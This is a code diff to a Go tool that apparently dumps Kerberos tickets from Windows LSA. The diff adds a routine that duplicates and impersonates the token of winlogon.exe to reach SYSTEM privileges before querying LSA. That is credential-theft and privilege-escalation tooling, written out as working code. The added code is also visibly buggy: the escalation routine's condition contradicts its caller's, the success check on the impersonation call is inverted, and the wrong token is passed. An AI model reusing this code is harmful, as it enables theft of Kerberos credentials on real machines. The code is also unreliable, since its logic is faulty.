@@ -163,6 +163,10 @@ type KrbCredInfo struct {
 	cAddr     *HostAddresses
 }
 
+type Elevation struct {
+	TokenIsElevated uint32
+}
+
 type TokenStatistics struct {
 	TokenID            windows.LUID
 	AuthenticationId   windows.LUID
@@ -300,12 +304,15 @@ const (
 // dll imports
 var (
 	secur32                        = windows.NewLazyDLL("secur32.dll")
+	advapi32                       = windows.NewLazyDLL("advapi32.dll")
 	LsaConnectUntrusted            = secur32.NewProc("LsaConnectUntrusted")
 	LsaLookupAuthenticationPackage = secur32.NewProc("LsaLookupAuthenticationPackage")
 	LsaCallAuthenticationPackage   = secur32.NewProc("LsaCallAuthenticationPackage")
 	LsaGetLogonSessionData         = secur32.NewProc("LsaGetLogonSessionData")
 	LsaFreeReturnBuffer            = secur32.NewProc("LsaFreeReturnBuffer")
 	LsaEnumerateLogonSessions      = secur32.NewProc("LsaEnumerateLogonSessions")
+	ImpersonateLoggedOnUser        = advapi32.NewProc("ImpersonateLoggedOnUser")
+	RevertToSelf                   = advapi32.NewProc("RevertToSelf")
 )
 
 const (
@@ -657,14 +664,159 @@ func enumerateTickets(lsaHandle windows.Handle, authPackage uint32) ([]SessionCr
 	return sessionCreds, nil
 }
 
+func isHighIntegrity() (bool, error) {
+	var token windows.Token
+	procHandle := windows.CurrentProcess()
+	err := windows.OpenProcessToken(procHandle, windows.TOKEN_QUERY, &token)
+	if err != nil {
+		return false, fmt.Errorf("OpenProcessToken failed: %v", err)
+	}
+	defer token.Close()
+
+	adminSID, err := windows.CreateWellKnownSid(windows.WinBuiltinAdministratorsSid)
+	if err != nil {
+		return false, fmt.Errorf("CreateWellKnownSid failed: %v", err)
+	}
+
+	isAdmin, err := token.IsMember(adminSID)
+	if err != nil {
+		return false, fmt.Errorf("IsMember failed: %v", err)
+	}
+
+	var elevation Elevation
+	var returnedLen uint32
+	err = windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&elevation)), uint32(unsafe.Sizeof(elevation)), &returnedLen)
+	if err != nil {
+		return false, err
+	}
+
+	return isAdmin && elevation.TokenIsElevated != 0, nil
+}
+
+func isSystem() (bool, error) {
+	var token windows.Token
+	procHandle := windows.CurrentProcess()
+	err := windows.OpenProcessToken(procHandle, windows.TOKEN_QUERY, &token)
+	if err != nil {
+		return false, fmt.Errorf("OpenProcessToken failed: %v", err)
+	}
+	defer token.Close()
+
+	systemSid, err := windows.CreateWellKnownSid(windows.WinLocalSystemSid)
+	if err != nil {
+		return false, fmt.Errorf("CreateWellKnownSid failed: %v", err)
+	}
+
+	isSystem, err := token.IsMember(systemSid)
+	if err != nil {
+		return false, fmt.Errorf("IsMember failed: %v", err)
+	}
+
+	return isSystem, nil
+}
+
+func getSystem() bool {
+	isHighIntegrity, err := isHighIntegrity()
+	if err != nil {
+		return false
+	}
+
+	if !isHighIntegrity {
+		//var token windows.Token
+		snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
+		if err != nil {
+			return false
+		}
+		defer windows.CloseHandle(snapshot)
+
+		var procEntry windows.ProcessEntry32
+		procEntry.Size = uint32(unsafe.Sizeof(procEntry))
+		if err := windows.Process32First(snapshot, &procEntry); err != nil {
+			return false
+		}
+
+		for {
+			processName := windows.UTF16ToString(procEntry.ExeFile[:])
+			if processName == "winlogon.exe" {
+				handle, err := windows.OpenProcess(
+					PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,
+					false,
+					procEntry.ProcessID,
+				)
+				if err != nil {
+					// this might not be the best way to handle this, although winlogon should only occur once in the ptree i believe?
+					return false
+				}
+
+				var token windows.Token
+				err = windows.OpenProcessToken(handle, windows.TOKEN_DUPLICATE, &token)
+				if err != nil {
+					return false
+				}
+				defer token.Close()
+
+				var duplicateToken windows.Token
+				err = windows.DuplicateTokenEx(token, windows.TOKEN_ALL_ACCESS, nil, windows.SecurityImpersonation, windows.TokenPrimary, &duplicateToken)
+				if err != nil {
+					return false
+				}
+
+				ret, _, err := ImpersonateLoggedOnUser.Call(uintptr(token))
+				if ret != 0 {
+					fmt.Printf("error: %v", err)
+				}
+
+				fmt.Printf("token should be NT AUTHORITY\\SYSTEM now\n")
+				return true
+			}
+
+			err = windows.Process32Next(snapshot, &procEntry)
+			if err != nil {
+				if err == windows.ERROR_NO_MORE_FILES {
+					break
+				}
+				return false
+			}
+		}
+		return false
+	}
+	return false
+}
+
 func getLsaHandle() (windows.Handle, error) {
-	// todo: add getSystem() function
+	isHighIntegrity, err := isHighIntegrity()
+	if err != nil {
+		return 0, err
+	}
+
+	isSystem, err := isSystem()
+	if err != nil {
+		return 0, err
+	}
+
 	var lsaHandle windows.Handle
-	ret, _, err := LsaConnectUntrusted.Call(
-		uintptr(unsafe.Pointer(&lsaHandle)),
-	)
-	if ret != 0 {
-		return lsaHandle, fmt.Errorf("LsaConnectUntrusted failed with error: %v", err)
+	if isHighIntegrity && !isSystem {
+		// elevated, but not system. time to impersonate some tokens
+		// todo: getSystem()
+		gotSystem := getSystem()
+		if gotSystem != true {
+			fmt.Printf("getSystem failed: %v", err)
+			return 0, err
+		}
+
+		ret, _, err := LsaConnectUntrusted.Call(
+			uintptr(unsafe.Pointer(&lsaHandle)),
+		)
+		if ret != 0 {
+			return lsaHandle, fmt.Errorf("LsaConnectUntrusted failed with error: %v", err)
+		}
+	} else {
+		ret, _, err := LsaConnectUntrusted.Call(
+			uintptr(unsafe.Pointer(&lsaHandle)),
+		)
+		if ret != 0 {
+			return lsaHandle, fmt.Errorf("LsaConnectUntrusted failed with error: %v", err)
+		}
 	}
 
 	return lsaHandle, nil
